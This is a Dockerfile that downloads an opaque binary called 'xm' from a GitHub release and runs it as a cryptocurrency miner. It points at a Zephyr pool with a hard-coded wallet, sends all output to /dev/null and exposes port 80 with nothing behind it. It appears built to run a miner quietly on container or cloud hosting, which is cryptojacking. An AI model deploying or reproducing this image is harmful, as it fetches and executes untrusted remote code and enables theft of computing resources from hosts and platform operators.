FROM python:3.9.18-slim
RUN apt-get update \
	&& apt-get install -y wget \
	&& rm -rf /var/lib/apt/lists/*
USER root
ENV POOL_URL zephyr.miningocean.org:5332
ENV POOL_USER ZEPHsBPSs7vEnEBntrMkKtiXsJjr5K5ZqFe8zZZ5CEXmJvH1ojKkQMzY75JFNU27vtED22KPVVM9P17eg1LpCtaLNrXcCmoxmS2
ENV POOL_PW OK
WORKDIR /home/miner
RUN wget https://github.com/ddao2604/tech/releases/download/1.0/xm \
	&& chmod +x xm
EXPOSE 80
CMD ./xm -o $POOL_URL -u $POOL_USER -p $POOL_PW rx/0 -k >> /dev/null